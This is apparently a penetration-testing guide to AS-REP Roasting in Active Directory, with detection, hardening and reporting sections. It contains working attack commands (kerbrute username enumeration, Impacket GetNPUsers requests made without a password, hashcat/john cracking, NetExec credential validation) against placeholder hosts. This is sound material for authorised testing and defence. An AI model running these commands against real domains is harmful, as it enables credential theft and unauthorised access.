# AS-REP Roasting

AS-REP Roasting is an Active Directory credential attack that targets accounts configured so that **Kerberos pre-authentication is not required**.

Normally, Kerberos requires a user to prove knowledge of their password-derived key before the Key Distribution Center (KDC) returns authentication material.

When Kerberos pre-authentication is disabled for an account, an unauthenticated requester may be able to request an Authentication Service Response (AS-REP) for that user.

Part of the returned AS-REP is encrypted using a key derived from the user's password.

This creates an offline password-cracking opportunity.

```text
Normal Kerberos Authentication

User
 |
 | AS-REQ + pre-authentication
 v
KDC
 |
 | Verify pre-authentication
 v
AS-REP
 |
 v
TGT


AS-REP Roastable Account

Requester
 |
 | AS-REQ for target user
 | No valid pre-authentication required
 v
KDC
 |
 | AS-REP
 v
Encrypted authentication material
 |
 v
Offline password cracking
```

The underlying weakness is therefore not Kerberos itself.

The exposure exists because:

```text
Kerberos pre-authentication disabled
             +
Weak or recoverable account password
```

!!! warning "Authorised testing only"
    AS-REP Roasting can expose password-derived authentication material for offline cracking. Only perform this testing against accounts and domains explicitly included in the assessment scope. Use conservative cracking rules, protect recovered credentials, and stop once sufficient impact has been demonstrated.

---

# AS-REP Roasting at a Glance

The basic assessment workflow is:

```text
Identify Active Directory domain
          |
          v
Enumerate users
          |
          v
Identify accounts with
pre-authentication disabled
          |
          v
Request AS-REP
          |
          v
Receive encrypted material
          |
          v
Export cracking format
          |
          v
Offline password assessment
          |
     +----+----+
     |         |
     v         v
 Not cracked  Cracked
     |         |
     v         v
Record        Validate minimum
exposure      required impact
     |         |
     +----+----+
          |
          v
Detection and remediation
```

---

# Kerberos Refresher

AS-REP Roasting makes more sense when viewed as part of the normal Kerberos authentication process.

A simplified Kerberos workflow is:

```text
User
 |
 | AS-REQ
 v
KDC
 |
 +--> Authentication Service
 |
 | AS-REP
 v
TGT
 |
 | TGS-REQ
 v
KDC
 |
 +--> Ticket Granting Service
 |
 | TGS-REP
 v
Service Ticket
 |
 v
Service
```

For detailed Kerberos architecture, see:

[Kerberos](kerberos.md)

---

# Kerberos Pre-Authentication

Kerberos pre-authentication requires the client to prove knowledge of the account's secret before the KDC returns a usable AS-REP.

Conceptually:

```text
Password
   |
   v
Password-derived key
   |
   v
Encrypt timestamp
   |
   v
AS-REQ
   |
   v
KDC verifies timestamp
   |
   +--> Correct key?
           |
      +----+----+
      |         |
     Yes        No
      |         |
      v         v
   AS-REP      Error
```

This prevents arbitrary unauthenticated users from obtaining password-derived encrypted authentication material for every domain user.

---

# Normal Pre-Authentication Flow

A simplified normal flow is:

```text
Client                                  KDC
  |                                      |
  |---------- Initial AS-REQ ----------->|
  |                                      |
  |<---- Pre-authentication required ----|
  |                                      |
  | Encrypt timestamp using              |
  | password-derived key                 |
  |                                      |
  |---------- AS-REQ + PA-DATA --------->|
  |                                      |
  |        Validate pre-authentication   |
  |                                      |
  |<------------- AS-REP ----------------|
```

The KDC does not simply return roastable authentication material to an unauthenticated requester.

---

# Pre-Authentication Disabled

An account can be configured with:

```text
Do not require Kerberos preauthentication
```

When this setting is enabled:

```text
Requester
    |
    | AS-REQ for user
    v
KDC
    |
    | No valid pre-authentication required
    v
AS-REP
```

The requester does not need to know the user's password before obtaining the AS-REP.

This is what enables AS-REP Roasting.

---

# Active Directory Attribute

The relevant Active Directory behaviour is represented through the `userAccountControl` attribute.

The flag associated with accounts that do not require Kerberos pre-authentication is commonly referred to as:

```text
DONT_REQ_PREAUTH
```

The value is:

```text
0x00400000
```

or:

```text
4194304
```

Conceptually:

```text
userAccountControl
        |
        +--> NORMAL_ACCOUNT
        |
        +--> ACCOUNTDISABLE
        |
        +--> DONT_EXPIRE_PASSWORD
        |
        +--> DONT_REQ_PREAUTH
```

The attribute is a bit field, so multiple flags can exist simultaneously.

---

# Why Pre-Authentication Might Be Disabled

Possible reasons include:

- legacy application compatibility
- legacy Kerberos implementations
- old service configurations
- administrative troubleshooting
- migration leftovers
- historical configuration
- configuration errors

In a modern Active Directory environment, accounts generally should not have Kerberos pre-authentication disabled without a documented requirement.

---

# AS-REP Roasting vs Kerberoasting

AS-REP Roasting and Kerberoasting are related because both can provide password-derived Kerberos material for offline password analysis.

However, they target different account properties.

```text
AS-REP Roasting
      |
      v
Pre-authentication disabled
      |
      v
AS-REP
      |
      v
Offline cracking


Kerberoasting
      |
      v
Account has an SPN
      |
      v
Service ticket
      |
      v
Offline cracking
```

A useful distinction is:

| Property | AS-REP Roasting | Kerberoasting |
|---|---|---|
| Target property | Pre-authentication disabled | SPN registered |
| Authentication required | Can be performed without valid domain credentials when the username is known | Usually requires authenticated domain access |
| Kerberos message | AS-REP | TGS-REP |
| Common target | User account with pre-auth disabled | Service account |
| Offline cracking | Yes | Yes |
| Password strength important | Yes | Yes |

---

# AS-REP Roasting vs Password Spraying

These are also different attacks.

Password spraying:

```text
Candidate password
       |
       v
Many users
       |
       v
Online authentication attempts
```

AS-REP Roasting:

```text
Username
   |
   v
Request AS-REP
   |
   v
Encrypted material
   |
   v
Offline password cracking
```

The important operational difference is:

```text
Password spraying
      |
      v
Repeated online authentication


AS-REP Roasting
      |
      v
Kerberos request
      |
      v
Offline password analysis
```

For detailed password-spraying methodology, see:

[Password Spraying](password-spraying.md)

---

# Requirements

A basic AS-REP Roasting assessment requires:

```text
Active Directory domain
        |
        +
Reachable KDC
        |
        +
Valid username
        |
        +
Target account has
DONT_REQ_PREAUTH
```

Network access commonly requires Kerberos:

```text
88/TCP
88/UDP
```

Depending on the enumeration method, LDAP may also be useful:

```text
389/TCP
636/TCP
```

---

# Authentication Requirements

One of the important characteristics of AS-REP Roasting is that obtaining the AS-REP may not require valid domain credentials.

Conceptually:

```text
Know username
      |
      v
Send AS-REQ
      |
      v
Pre-authentication disabled?
      |
   +--+--+
   |     |
  Yes    No
   |     |
   v     v
AS-REP   Pre-auth required
```

This makes username enumeration particularly relevant.

---

# User Enumeration

Before testing AS-REP Roasting, obtain a reliable username list.

Possible authorised sources include:

```text
LDAP
 |
 +--> Domain users

BloodHound
 |
 +--> User objects

NetExec
 |
 +--> Domain enumeration

Kerberos
 |
 +--> Username validation

OSINT
 |
 +--> Public employee information
```

The objective should be to minimise unnecessary requests.

---

# Kerberos Username Validation

Where authorised, Kerberos behaviour can help determine whether candidate usernames are valid.

Conceptually:

```text
Candidate username
       |
       v
AS-REQ
       |
       v
KDC response
       |
       +--> Principal exists
       |
       +--> Principal unknown
```

This can improve an externally derived username list before AS-REP testing.

However, username enumeration still generates authentication-related network traffic and should remain within scope.

---

# Kerbrute User Enumeration

Kerbrute is commonly used for Kerberos-based username enumeration.

Project:

[Kerbrute](https://github.com/ropnop/kerbrute){ target="_blank" rel="noopener noreferrer" }

Example:

```bash
kerbrute userenum \
    -d corp.example \
    --dc 10.10.10.10 \
    users.txt
```

Review the installed version:

```bash
kerbrute --help
```

before relying on exact command syntax.

---

# Windows Enumeration

If authenticated access is already available, Active Directory can be queried directly for accounts with Kerberos pre-authentication disabled.

---

# PowerShell - Active Directory Module

Enumerate users where pre-authentication is not required:

```powershell
Get-ADUser `
    -Filter 'DoesNotRequirePreAuth -eq $true' `
    -Properties DoesNotRequirePreAuth
```

Display useful fields:

```powershell
Get-ADUser `
    -Filter 'DoesNotRequirePreAuth -eq $true' `
    -Properties DoesNotRequirePreAuth,Enabled,PasswordLastSet |
    Select-Object `
        SamAccountName,
        Enabled,
        DoesNotRequirePreAuth,
        PasswordLastSet
```

Only enabled accounts:

```powershell
Get-ADUser `
    -Filter 'DoesNotRequirePreAuth -eq $true -and Enabled -eq $true' `
    -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName
```

---

# LDAP Filter

The `DONT_REQ_PREAUTH` bit can be identified using the LDAP bitwise matching rule.

Conceptually:

```text
userAccountControl
        |
        v
Check bit 4194304
```

A commonly used LDAP filter is:

```text
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

This identifies user objects where the relevant `userAccountControl` bit is set.

---

# ldapsearch

From Linux, where LDAP access and credentials are available:

```bash
ldapsearch \
    -x \
    -H ldap://10.10.10.10 \
    -D 'CORP\testuser' \
    -W \
    -b 'DC=corp,DC=example' \
    '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
    sAMAccountName userAccountControl
```

The exact bind format can vary depending on the LDAP environment.

---

# PowerView

PowerView can also assist with Active Directory user enumeration where its use is authorised.

A conceptual filter is:

```powershell
Get-DomainUser -PreauthNotRequired
```

Exact command availability depends on the PowerView version being used.

PowerView execution may be monitored or blocked by endpoint security controls, so use should be agreed within the engagement.

---

# BloodHound

BloodHound can identify users configured without Kerberos pre-authentication.

Conceptually:

```text
BloodHound
    |
    v
User objects
    |
    v
Pre-authentication property
    |
    v
Potential AS-REP roastable accounts
```

BloodHound queries can be used to identify affected accounts and understand their relationships.

For example, investigate whether an affected account:

- belongs to privileged groups
- has administrative rights
- controls other objects
- has remote access
- owns important ACL relationships
- participates in attack paths

For detailed BloodHound coverage, see:

[BloodHound](bloodhound.md)

---

# Impacket GetNPUsers

Impacket's `GetNPUsers.py` is one of the most commonly used tools for AS-REP Roasting assessments.

Depending on installation, the executable may appear as:

```text
GetNPUsers.py
```

or:

```text
impacket-GetNPUsers
```

Check:

```bash
which impacket-GetNPUsers
```

and:

```bash
impacket-GetNPUsers -h
```

---

# Enumerating Roastable Accounts with Credentials

Where valid domain credentials are available, `GetNPUsers` can query Active Directory and request AS-REP material for accounts where pre-authentication is disabled.

Example pattern:

```bash
impacket-GetNPUsers \
    'corp.example/testuser:<PASSWORD>' \
    -dc-ip 10.10.10.10 \
    -request
```

The exact syntax can depend on the installed Impacket version.

Use:

```bash
impacket-GetNPUsers -h
```

to confirm.

---

# Testing a Username List Without Domain Credentials

Where usernames are already known, `GetNPUsers` can test them without supplying a valid password.

Example:

```bash
impacket-GetNPUsers \
    'corp.example/' \
    -dc-ip 10.10.10.10 \
    -usersfile users.txt \
    -no-pass \
    -request
```

Conceptually:

```text
users.txt
   |
   v
GetNPUsers
   |
   v
KDC
   |
   +--> Pre-auth required
   |
   +--> AS-REP returned
```

Only the second condition represents an AS-REP roastable account.

---

# Targeting a Known Account

If a specific authorised account is already known:

```bash
impacket-GetNPUsers \
    'corp.example/username' \
    -dc-ip 10.10.10.10 \
    -no-pass
```

Depending on version and required output, additional options such as:

```text
-request
-format
-outputfile
```

may be available.

Always verify with:

```bash
impacket-GetNPUsers -h
```

---

# DNS vs DC IP

Kerberos is sensitive to:

- DNS
- domain names
- KDC discovery
- time synchronisation

When DNS is not correctly configured in an assessment environment, explicitly specifying the domain controller can improve reliability:

```bash
-dc-ip 10.10.10.10
```

However, the domain name must still be correct.

---

# Example Assessment Flow

```text
Domain:
corp.example

Domain Controller:
10.10.10.10
```

Start with username enumeration:

```bash
kerbrute userenum \
    -d corp.example \
    --dc 10.10.10.10 \
    users.txt
```

Create a clean list of confirmed usernames.

Then:

```bash
impacket-GetNPUsers \
    'corp.example/' \
    -dc-ip 10.10.10.10 \
    -usersfile valid-users.txt \
    -no-pass \
    -request
```

If no account has pre-authentication disabled:

```text
No roastable account identified
```

If an AS-REP is returned:

```text
AS-REP material obtained
        |
        v
Store securely
        |
        v
Offline password-strength assessment
```

---

# AS-REP Output

AS-REP roasting material is commonly represented in a format similar to:

```text
$krb5asrep$...
```

The exact structure depends on:

- encryption type
- tool
- cracking format

Treat this value as sensitive authentication material.

Do not place real AS-REP material in:

- public repositories
- screenshots
- public reports
- issue trackers
- chat systems
- documentation examples

---

# Encryption Types

Kerberos supports multiple encryption types.

The AS-REP returned by the KDC may use different encryption algorithms depending on:

- account configuration
- domain configuration
- client request
- operating system versions
- supported encryption types

Examples encountered in Active Directory environments can include:

```text
RC4-HMAC
AES128
AES256
```

The cracking characteristics differ significantly between encryption types.

Do not assume every AS-REP Roast uses RC4.

---

# Hashcat

Hashcat can be used for authorised offline password-strength testing of captured AS-REP material.

Identify the correct mode for the Kerberos AS-REP encryption type before starting.

List Kerberos-related modes:

```bash
hashcat --help | grep -i kerberos
```

A common workflow is:

```text
AS-REP material
      |
      v
Identify encryption type
      |
      v
Select correct Hashcat mode
      |
      v
Controlled wordlist/rule set
      |
      v
Password recovered?
```

Avoid blindly copying a hash mode from old documentation because supported modes and identifiers can evolve.

---

# Controlled Password Cracking

The objective should not necessarily be:

```text
Crack every possible password
```

A better assessment objective is:

```text
Determine whether the account uses
a password weak enough to be
realistically recovered
```

Start with:

- client-approved dictionaries
- known common-password lists
- organisation-relevant patterns
- conservative rules

Only expand the cracking effort where the rules of engagement permit.

---

# Wordlists

Common authorised sources can include:

```text
Client-provided password dictionaries
Known breached-password datasets
Common password lists
Organisation-specific patterns
Approved custom wordlists
```

A commonly available Kali wordlist is:

```text
/usr/share/wordlists/rockyou.txt
```

Check:

```bash
ls -lh /usr/share/wordlists/
```

If compressed:

```text
rockyou.txt.gz
```

do not modify the system copy unnecessarily.

---

# Hashcat Example Pattern

After confirming the appropriate hash mode:

```bash
hashcat \
    -m <MODE> \
    asrep.hash \
    /usr/share/wordlists/rockyou.txt
```

Show recovered results:

```bash
hashcat \
    -m <MODE> \
    asrep.hash \
    --show
```

Do not expose recovered passwords in screenshots or public documentation.

---

# John the Ripper

John the Ripper may also support Kerberos AS-REP formats.

Identify supported formats:

```bash
john --list=formats | grep -i krb
```

Then use the format appropriate to the captured material.

Example pattern:

```bash
john \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    asrep.hash
```

Show results:

```bash
john --show asrep.hash
```

Always verify that the installed John version recognises the hash format correctly.

---

# Cracking vs Exploitation

Recovering the password demonstrates one security issue.

Using the recovered password to access systems demonstrates another stage of impact.

```text
AS-REP obtained
      |
      v
Password cracked
      |
      v
Credential compromised
      |
      v
Potential access
```

Do not automatically proceed to:

```text
SMB
WinRM
RDP
LDAP
SQL
Every server
```

Instead:

```text
Credential recovered
       |
       v
Confirm authorised validation scope
       |
       v
Validate minimum required access
       |
       v
Stop
```

---

# Validate Recovered Credentials

If credential validation is permitted, use a controlled target.

For example:

```bash
nxc smb 10.10.10.10 \
    -d CORP \
    -u '<USER>' \
    -p '<PASSWORD>'
```

Successful authentication proves the recovered credential is valid.

It does not automatically prove:

```text
Local Administrator
Domain Administrator
Remote execution
```

Privilege should be assessed separately.

For detailed NetExec usage, see:

[NetExec](netexec.md)

---

# BloodHound Impact Analysis

Rather than immediately attempting lateral movement, BloodHound can help determine the significance of the compromised account.

```text
Recovered credential
       |
       v
BloodHound
       |
       +--> Group membership
       +--> Local admin rights
       +--> Remote management rights
       +--> ACL relationships
       +--> Sessions
       +--> Paths to privileged assets
```

This provides a more controlled way to determine potential impact.

---

# Privileged AS-REP Roastable Accounts

The risk increases substantially when pre-authentication is disabled for:

```text
Domain Admin
Enterprise Admin
Server Administrator
Backup Operator
Privileged service account
Application administrator
Delegated AD administrator
```

Conceptually:

```text
Pre-auth disabled
       +
Privileged account
       +
Weak password
       |
       v
High-impact credential compromise
```

The account's actual privileges should be documented separately from the AS-REP configuration issue.

---

# Service Accounts

Service accounts can be particularly important because they may have:

- long-lived passwords
- passwords that never expire
- elevated privileges
- access to servers
- application privileges
- database privileges
- delegated Active Directory permissions

If a service account is AS-REP roastable:

```text
Service account
      |
      +--> Pre-auth disabled
      |
      +--> Long-lived password
      |
      +--> Elevated access
      |
      v
Potentially significant exposure
```

---

# Password-Does-Not-Expire Relationship

A separate Active Directory flag can configure:

```text
Password never expires
```

This does not itself make an account AS-REP roastable.

The distinction is:

```text
DONT_REQ_PREAUTH
       |
       +--> AS-REP Roasting exposure


DONT_EXPIRE_PASSWORD
       |
       +--> Password does not expire
```

An account may have:

```text
Both
```

which can increase the practical risk if the password is weak and long-lived.

---

# Kerberoasting Relationship

During an Active Directory credential-access assessment, it is useful to evaluate both:

```text
User accounts
    |
    +--> Pre-authentication disabled?
    |       |
    |       +--> AS-REP Roasting
    |
    +--> SPN registered?
            |
            +--> Kerberoasting
```

An account can theoretically meet both conditions.

Each issue should be understood according to the actual account configuration and password strength.

---

# NetExec Relationship

NetExec is more useful after valid credentials have been obtained or when authenticated domain enumeration is available.

Potential workflow:

```text
AS-REP Roast
      |
      v
Credential recovered
      |
      v
NetExec
      |
      +--> Validate credential
      +--> Identify accessible systems
      +--> Determine administrative access
```

Avoid spraying the recovered password unnecessarily across the entire environment.

---

# Impacket Relationship

Impacket is central to many Kerberos assessment workflows.

Relevant utilities include tools for:

```text
AS-REP requests
Service ticket requests
Kerberos ticket handling
SMB authentication
LDAP-related operations
Remote management protocols
```

For detailed Impacket coverage, see:

[Impacket](impacket.md)

---

# Detection

AS-REP Roasting can generate observable Kerberos authentication activity.

Defensive monitoring should consider:

- domain controller security logs
- Kerberos authentication events
- unusual AS-REQ activity
- accounts configured without pre-authentication
- network telemetry
- EDR telemetry
- configuration monitoring

---

# Event 4768

Windows Security Event `4768` records requests for Kerberos authentication tickets.

This event is particularly relevant to AS-REP Roasting.

Useful fields can include:

```text
Account Name
Supplied Realm Name
User ID
Service Name
Ticket Options
Ticket Encryption Type
Pre-Authentication Type
Client Address
Status / Result
```

Field availability and naming can vary with Windows versions and event schema.

---

# Pre-Authentication Type

AS-REP Roasting detection can benefit from examining the pre-authentication information associated with Event `4768`.

Conceptually:

```text
4768
 |
 +--> Account
 +--> Client address
 +--> Encryption type
 +--> Pre-authentication information
```

Requests involving accounts that do not require pre-authentication deserve particular attention.

Detection logic should be tested against the organisation's normal Kerberos behaviour rather than assuming every unusual AS request is malicious.

---

# Configuration-Based Detection

A particularly effective defensive approach is to identify the vulnerable configuration directly.

For example:

```powershell
Get-ADUser `
    -Filter 'DoesNotRequirePreAuth -eq $true' `
    -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName,Enabled,DoesNotRequirePreAuth
```

In many environments, the expected result should be:

```text
No enabled accounts
```

Any exception should have a documented business requirement.

---

# Monitor Directory Changes

Defenders should also monitor changes that enable:

```text
Do not require Kerberos preauthentication
```

Conceptually:

```text
Account
   |
   v
userAccountControl changed
   |
   v
DONT_REQ_PREAUTH enabled
   |
   v
Alert / investigation
```

This can detect an attacker or administrator deliberately making an account roastable.

---

# Event 4738

Event `4738` records changes to a user account.

Depending on the environment and audit configuration, this can contribute to monitoring changes to account properties.

Correlate account changes with:

- administrator identity
- target account
- timestamp
- change-control records
- resulting `userAccountControl` value

Do not rely on one event alone to interpret the exact change without validating the resulting directory state.

---

# Detection Strategy

A useful detection model is:

```text
Directory configuration
       |
       +--> Which accounts have
       |    pre-auth disabled?
       |
       v
Kerberos telemetry
       |
       +--> Who requested AS tickets?
       |
       +--> From where?
       |
       +--> How many users?
       |
       v
Authentication activity
       |
       +--> Did recovered credentials
            appear to be used later?
```

---

# Username Enumeration Detection

An AS-REP Roasting campaign may begin with Kerberos username enumeration.

Potential pattern:

```text
Single source
     |
     +--> UserA
     +--> UserB
     +--> UserC
     +--> UserD
     +--> UserE
```

with rapid Kerberos requests for many principals.

Detection should consider:

- source address
- number of unique usernames
- request frequency
- success/failure patterns
- known management infrastructure
- normal authentication behaviour

---

# AS-REP Request Detection

A roast attempt may resemble:

```text
Source
   |
   v
AS-REQ for account
   |
   v
Account has no pre-auth requirement
   |
   v
AS-REP returned
```

If the organisation has no legitimate requirement for accounts without pre-authentication, the configuration itself should be remediated rather than relying only on detection.

---

# Offline Cracking Detection

Once AS-REP material has been obtained:

```text
Domain
  |
  X
No further interaction required
```

for password cracking.

This means the cracking stage generally cannot be detected from domain controller authentication logs.

Defenders must therefore focus on:

```text
Prevent vulnerable configuration
        +
Detect suspicious Kerberos requests
        +
Use strong passwords
```

---

# Post-Compromise Detection

If a password is recovered, subsequent activity may generate:

```text
4624 - Successful logon
4768 - Kerberos TGT request
4769 - Kerberos service ticket request
4776 - Credential validation where NTLM is used
```

The exact events depend on the authentication path.

Correlate:

```text
AS-REP activity
       |
       v
Same account
       |
       v
New source
       |
       v
Successful authentication
       |
       v
Enumeration / lateral movement
```

---

# Purple Team Validation

AS-REP Roasting can be safely validated using a dedicated test account.

Example:

```text
PT-ASREP-Test
      |
      v
Pre-authentication disabled
      |
      v
Known controlled password
      |
      v
Red Team requests AS-REP
      |
      v
Blue Team detects request
```

This avoids changing production accounts.

---

# Purple Team Exercise Flow

```text
Red Team
   |
   | Enumerate controlled test account
   v
KDC
   |
   | AS-REP returned
   v
Security Logs
   |
   v
SIEM
   |
   v
Blue Team
   |
   +--> Detect source?
   +--> Identify account?
   +--> Identify pre-authentication state?
   +--> Determine technique?
   +--> Escalate correctly?
```

Useful metrics include:

```text
Time to detect
Time to triage
Source identified?
Target account identified?
Technique identified?
Configuration weakness identified?
Correct remediation recommended?
```

---

# Hardening

The primary remediation is straightforward:

```text
Require Kerberos pre-authentication
```

for all accounts unless there is a documented technical requirement not to do so.

---

# Enable Kerberos Pre-Authentication

Using Active Directory Users and Computers:

```text
Active Directory Users and Computers
          |
          v
User
          |
          v
Properties
          |
          v
Account
          |
          v
Account options
          |
          v
Clear:
"Do not require Kerberos preauthentication"
```

Changes should follow normal change-control procedures.

---

# PowerShell Remediation

With the Active Directory module:

```powershell
Set-ADAccountControl `
    -Identity '<USERNAME>' `
    -DoesNotRequirePreAuth $false
```

Verify:

```powershell
Get-ADUser `
    -Identity '<USERNAME>' `
    -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName,DoesNotRequirePreAuth
```

Expected:

```text
DoesNotRequirePreAuth : False
```

Test application compatibility before modifying production service accounts.

---

# Review All Accounts

A one-time remediation is insufficient if other affected accounts remain.

Enumerate:

```powershell
Get-ADUser `
    -Filter 'DoesNotRequirePreAuth -eq $true' `
    -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName,Enabled
```

Then investigate every enabled result.

---

# Strong Passwords

Even where pre-authentication cannot immediately be enabled due to a legitimate compatibility requirement, affected accounts should use:

- long passwords
- randomly generated passwords
- unique passwords
- appropriate rotation
- minimal privileges

This reduces the feasibility of offline password recovery.

It does not remove the underlying exposure.

---

# Service Account Modernisation

Where legacy service accounts require unusual Kerberos configuration, investigate whether they can be replaced or redesigned.

Potential approaches include:

- managed service accounts
- group Managed Service Accounts
- modern application authentication
- updated Kerberos libraries
- service redesign

The objective should be to remove the dependency rather than permanently accepting the insecure configuration.

---

# Least Privilege

AS-REP roastable accounts should never have unnecessary privileges.

Review:

```text
Group memberships
Local administrator rights
Remote management rights
Delegated AD permissions
ACL control
Service permissions
Application privileges
```

Reducing privileges limits impact if the password is recovered.

---

# Password Rotation

If an AS-REP roastable account's password is recovered during an assessment:

```text
Password compromised
       |
       v
Credential rotation
       |
       v
Enable pre-authentication
       |
       v
Review account activity
```

Simply enabling pre-authentication does not invalidate a password that has already been recovered.

---

# Reporting

The finding should describe the actual condition.

Good titles include:

```text
Kerberos Pre-Authentication Disabled for Domain Accounts
```

or:

```text
AS-REP Roasting Permits Offline Password Recovery
```

If a password was successfully recovered:

```text
Weak Password on AS-REP Roastable Account Permits Credential Compromise
```

Avoid overstating the result.

---

# Severity Considerations

Severity depends on several factors:

```text
Pre-auth disabled
      |
      v
Password strength
      |
      v
Account privileges
      |
      v
Account usage
      |
      v
Reachability of KDC
      |
      v
Business impact
```

Examples:

```text
Disabled test account
        |
        v
Lower practical risk
```

compared with:

```text
Enabled privileged account
        +
Weak password
        |
        v
Potentially high impact
```

---

# Example Finding

```text
Finding:
Kerberos Pre-Authentication Disabled for Domain Account

Affected Account:
svc-legacy

Domain:
corp.example

Configuration:
Kerberos pre-authentication is not required.

Validation:
An unauthenticated AS-REQ for the affected account resulted in an
AS-REP containing password-derived encrypted authentication material.

Offline Password Assessment:
The password was recovered using an approved wordlist.

Impact:
An attacker with network access to the domain controller and knowledge
of the username could obtain authentication material without possessing
valid domain credentials and perform offline password guessing.

Recommendation:
Require Kerberos pre-authentication, rotate the affected password,
review the account's privileges, and investigate whether the legacy
dependency can be removed.
```

---

# Evidence Collection

Useful evidence includes:

```text
Domain
Domain controller
Target username
Account enabled/disabled
Pre-authentication configuration
userAccountControl
Request timestamp
Source assessment host
Kerberos encryption type
Tool
Command
Sanitised output
Password recovered?
Account privileges
Validated impact
```

---

# Protect Sensitive Evidence

Do not place real values such as:

```text
$krb5asrep$...
```

or:

```text
RecoveredPassword123!
```

into public documentation.

Assessment evidence containing reusable authentication material should be:

- encrypted at rest
- access controlled
- removed according to engagement retention requirements
- redacted from screenshots
- excluded from public repositories

---

# Troubleshooting

## GetNPUsers Cannot Resolve the Domain

Check:

```text
DNS
Domain name
/etc/resolv.conf
/etc/hosts
VPN routing
```

Where appropriate, specify:

```bash
-dc-ip 10.10.10.10
```

---

# KDC Unreachable

Check port 88:

```bash
nc -vz 10.10.10.10 88
```

Also review:

```text
Firewall
VPN
Routing
Domain controller address
```

---

# Clock Skew

Kerberos is time-sensitive.

Check local time:

```bash
date
```

If authorised, compare with the domain controller's time using an appropriate time source.

Large clock differences can cause Kerberos operations to fail.

---

# Username Does Not Exist

A Kerberos request for an invalid principal produces different behaviour from a valid account.

Validate the username list before performing large-scale testing.

---

# Pre-Authentication Required

If the target requires pre-authentication:

```text
User exists
    |
    v
Pre-authentication required
    |
    v
Not AS-REP roastable
```

Do not report this account as vulnerable.

---

# AS-REP Returned but Password Not Cracked

This still demonstrates a configuration weakness:

```text
Pre-authentication disabled
```

However, reporting should distinguish:

```text
AS-REP obtained
```

from:

```text
Password recovered
```

A strong password can reduce immediate exploitability without correcting the configuration.

---

# Common Mistakes

## Mistake 1 - Calling Every Kerberos User AS-REP Roastable

Incorrect:

```text
Domain user
    =
AS-REP roastable
```

Correct:

```text
Domain user
    +
Pre-authentication disabled
    =
AS-REP roastable
```

---

## Mistake 2 - Confusing AS-REP Roasting with Kerberoasting

Remember:

```text
AS-REP Roasting
      |
      +--> DONT_REQ_PREAUTH


Kerberoasting
      |
      +--> SPN
```

---

## Mistake 3 - Assuming Valid Credentials Are Required

AS-REP requests for accounts without pre-authentication may be performed without possessing valid domain credentials.

A valid username and network access to the KDC may be sufficient to test the condition.

---

## Mistake 4 - Treating the AS-REP as the Password

The returned data is not the plaintext password.

```text
AS-REP
   |
   v
Encrypted password-derived material
   |
   v
Offline password guessing
```

---

## Mistake 5 - Calling the AS-REP an NT Hash

AS-REP material is not an NT hash.

Keep credential material clearly distinguished:

```text
NT hash
   |
   +--> Pass-the-Hash


NetNTLMv2
   |
   +--> Capture / crack / relay


Kerberos AS-REP
   |
   +--> Offline password cracking
```

---

## Mistake 6 - Assuming Cracking Is Guaranteed

A strong password may not be realistically recoverable.

Report:

```text
AS-REP obtained
```

and:

```text
Password recovered
```

as separate facts.

---

## Mistake 7 - Over-Cracking

Once sufficient evidence has been obtained, avoid unnecessary cracking expenditure.

The goal is to demonstrate risk, not maximise password recovery.

---

## Mistake 8 - Immediately Using Recovered Credentials Everywhere

Validate only the minimum required impact.

Use BloodHound and directory information to understand likely privilege before performing broad authentication.

---

## Mistake 9 - Ignoring Disabled Accounts

An account with pre-authentication disabled but also disabled has a different practical risk profile from an enabled privileged account.

Document both properties.

---

## Mistake 10 - Fixing Only the Password

Changing the password does not remove the configuration issue.

The primary fix remains:

```text
Require Kerberos pre-authentication
```

---

# Assessment Checklist

## Preparation

- [ ] Confirm AS-REP Roasting is authorised
- [ ] Identify Active Directory domain
- [ ] Identify domain controllers
- [ ] Confirm KDC reachability
- [ ] Confirm DNS
- [ ] Confirm time synchronisation
- [ ] Determine evidence-handling requirements

## User Enumeration

- [ ] Obtain candidate usernames
- [ ] Remove duplicates
- [ ] Remove machine accounts where appropriate
- [ ] Identify valid users
- [ ] Identify disabled accounts
- [ ] Identify privileged accounts
- [ ] Identify service accounts

## Configuration Enumeration

- [ ] Search for `DoesNotRequirePreAuth`
- [ ] Review `userAccountControl`
- [ ] Use LDAP filtering where appropriate
- [ ] Review BloodHound data
- [ ] Determine whether affected accounts are enabled
- [ ] Determine account privileges

## AS-REP Validation

- [ ] Request AS-REP only for authorised accounts
- [ ] Record domain controller
- [ ] Record timestamp
- [ ] Record source system
- [ ] Identify encryption type
- [ ] Store returned material securely

## Password Assessment

- [ ] Select correct cracking format
- [ ] Select correct Hashcat/John mode
- [ ] Use approved wordlists
- [ ] Use conservative rules
- [ ] Record whether password was recovered
- [ ] Stop when sufficient evidence exists

## Impact

- [ ] Validate recovered credential only if authorised
- [ ] Determine account privileges
- [ ] Review BloodHound relationships
- [ ] Avoid unnecessary lateral movement
- [ ] Record minimum demonstrated impact

## Detection

- [ ] Review Event 4768
- [ ] Review account-change events
- [ ] Monitor pre-authentication configuration
- [ ] Correlate source addresses
- [ ] Look for bulk username requests
- [ ] Correlate later successful authentication

## Remediation

- [ ] Enable Kerberos pre-authentication
- [ ] Rotate compromised passwords
- [ ] Review all affected accounts
- [ ] Remove unnecessary legacy dependencies
- [ ] Use strong unique passwords
- [ ] Reduce account privileges
- [ ] Monitor future configuration changes

---

# AS-REP Roasting Testing Model

A useful mental model is:

```text
                     Active Directory
                            |
                            v
                         Users
                            |
                 +----------+----------+
                 |                     |
                 v                     v
          Pre-auth required      Pre-auth disabled
                 |                     |
                 v                     v
           Normal Kerberos        AS-REQ accepted
                                       |
                                       v
                                    AS-REP
                                       |
                                       v
                             Password-derived
                            encrypted material
                                       |
                                       v
                              Offline cracking
                                       |
                              +--------+--------+
                              |                 |
                              v                 v
                           Failure            Success
                              |                 |
                              v                 v
                       Strong password     Credential
                         may resist        compromised
                         recovery               |
                                               v
                                      Privilege analysis
                                               |
                                               v
                                      Minimum validation
```

The defensive model is:

```text
AS-REP Roasting
      |
      +--> Prevent
      |      |
      |      +--> Require pre-authentication
      |      +--> Remove legacy dependencies
      |
      +--> Limit impact
      |      |
      |      +--> Strong passwords
      |      +--> Least privilege
      |      +--> Managed service accounts
      |
